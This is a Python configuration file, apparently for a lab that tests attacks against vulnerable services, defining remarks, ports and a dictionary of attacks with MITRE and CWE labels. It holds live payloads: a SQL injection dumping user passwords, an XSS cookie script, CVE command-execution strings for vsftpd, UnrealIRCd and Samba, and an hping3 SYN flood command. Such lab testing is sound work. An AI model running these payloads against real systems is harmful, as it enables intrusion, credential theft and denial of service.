#!/usr/bin/python3

# remark list
fail_service_down = 'Service was inaccessible before the exploit'
fail_service_down_during_attack = 'Service was inaccessible during the exploit'
success_bruteforce = 'Valid password found during brute-force attempt'
fail_bruteforce = 'No valid password found during brute-force attempt'
success_dos = 'Service is DOWN due to DoS attack'
fail_dos = 'Service remains ACCESSIBLE after DoS attack'
success_nmap = 'Nmap successfully enumerated the port'
fail_nmap = 'Nmap failed to enumerate the port'
success_exploit = 'Exploit successful and RCE achieved'
fail_exploit = 'Exploit successful but RCE is not achieved'
fail_vsftpd = 'Exploit failed due to backdoor on port 6200 being inaccessible'
success_exploit_dvwa = 'Web exploit successful'
fail_exploit_dvwa = 'Web exploit successful but blocked by IPS'
fail_exploit_dvwa_full = 'Web exploit blocked'

# ports lisr
HTTP_PORT = 80
FTP_PORT = 21
IRC_PORT = 6667
IRC_PORT_CLOUD = 8000
SAMBA_PORT = 445
SAMBA_PORT_CLOUD = 8001
SSH_PORT = 22

# attack list
attacks = {
    'sqli': {
        'payload': "1'+union+all+select+database(),concat(user,\"|\",password)+FROM+dvwa.users+limit+1,1%23&Submit=Submit",
        'attack': 'SQL Injection',
        'mitre': 'TA0010: Exfiltration',
        'cwe': 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command ("SQL Injection")',
        'port': HTTP_PORT,
        'service': 'http',
        'type': 'Web',
        'path': '/etc/init.d/apache2',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'xss': {
        'payload': '<script>alert(document.cookie);</script>',
        'attack': 'Cross Site Scripting (XSS)',
        'mitre': 'TA0004: Privilege Escalation',
        'cwe': 'CWE-79: Improper Neutralization of Input During Web Page Generation (\'Cross-site Scripting\')',
        'port': HTTP_PORT,
        'service': 'http',
        'type': 'Web',
        'path': '/etc/init.d/apache2',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'os': {
        'payload': 'id',
        'attack': 'OS Command Injection',
        'mitre': 'TA0002: Execution',
        'cwe': 'CWE-78: OS Command Injection',
        'port': HTTP_PORT,
        'service': 'http',
        'type': 'Web',
        'path': '/etc/init.d/apache2',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'vsftpd': {
        'payload': 'pwned:)',
        'attack': 'CVE-2011-2523: VSFTPD Backdoor Command Execution',
        'mitre': 'TA0002: Execution',
        'cwe': 'CWE-1104: Use of Unmaintained Third Party Components',
        'port': FTP_PORT,
        'service': 'ftp',
        'type': 'Server',
        'path': '/etc/init.d/xinetd',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'unrealircd': {
        'payload': f'/bin/bash -c "/bin/rm -rf /tmp/root.txt; /usr/bin/whoami > /tmp/root.txt; /bin/chmod 777 /tmp/root.txt"',
        'cleanup': f'/bin/bash -c "/bin/rm -rf /tmp/root.txt"',
        'attack': 'CVE-2010-2075: UnrealIRCd Remote Code Execution',
        'mitre': 'TA0001: Initial Access',
        'cwe': 'CWE-1104: Use of Unmaintained Third Party Components',
        'port': {IRC_PORT, IRC_PORT_CLOUD},
        'service': 'irc',
        'type': 'Server',
        'path': '/usr/bin/unrealircd',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'samba': {
        'payload': f'/bin/bash -c "/bin/rm -rf /tmp/root.txt; /usr/bin/whoami > /tmp/root.txt; /bin/chmod 777 /tmp/root.txt"',
        'cleanup': f'/bin/bash -c "/bin/rm -rf /tmp/root.txt"',
        'attack': 'CVE-2007-2447: Samba "username map script" Command Execution',
        'mitre': 'TA0002: Execution',
        'cwe': 'CWE-1104: Use of Unmaintained Third Party Components',
        'port': {SAMBA_PORT, SAMBA_PORT_CLOUD},
        'service': 'samba',
        'type': 'Server',
        'path': '/etc/init.d/samba',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'bruteforce_ssh': {
        'payload': 'passwords.txt',
        'attack': 'SSH Bruteforce',
        'mitre': 'T1110.001: Brute Force (Password Guessing)',
        'cwe': 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
        'port': SSH_PORT,
        'service': 'ssh',
        'type': 'Server',
        'path': '/etc/init.d/ssh',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'nmap_ssh': {
        'payload': '/usr/bin/nmap',
        'attack': 'Network Enumeration (nmap)',
        'mitre': 'T1046: Network Service Discovery',
        'cwe': 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor',
        'port': SSH_PORT,
        'service': 'ssh',
        'type': 'Network',
        'path': '/etc/init.d/ssh',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'nmap_samba': {
        'payload': '/usr/bin/nmap',
        'attack': 'Network Enumeration (nmap)',
        'mitre': 'T1046: Network Service Discovery',
        'cwe': 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor',
        'port': {SAMBA_PORT, SAMBA_PORT_CLOUD},
        'service': 'samba',
        'type': 'Network',
        'path': '/etc/init.d/samba',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'dos_syn': {
        'payload': '/usr/bin/sudo /usr/sbin/hping3 -S --flood --rand-source -p 80 -c 65535 -d 65495 -q -n 10.251.5.5',
        'attack': 'SYN Flood DDoS',
        'mitre': 'T1498: Network Denial of Service (Direct Network Flood)',
        'cwe': 'CWE-400: Uncontrolled Resource Consumption',
        'port': HTTP_PORT,
        'service': 'http',
        'type': 'Network',
        'path': '/etc/init.d/apache2',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        },
    'dos_slowloris': {
        'payload': '/usr/bin/slowhttptest',
        'attack': 'HTTP Slowloris DoS',
        'mitre': 'T1498: Network Denial of Service (Direct Network Flood)',
        'cwe': 'CWE-400: Uncontrolled Resource Consumption',
        'port': HTTP_PORT,
        'service': 'http',
        'type': 'Network',
        'path': '/etc/init.d/apache2',
        'status (ping)': 'DOWN',
        'status (service)': 'DOWN',
        'status (attack)': 'BLOCKED',
        'remark': fail_service_down_during_attack
        }
}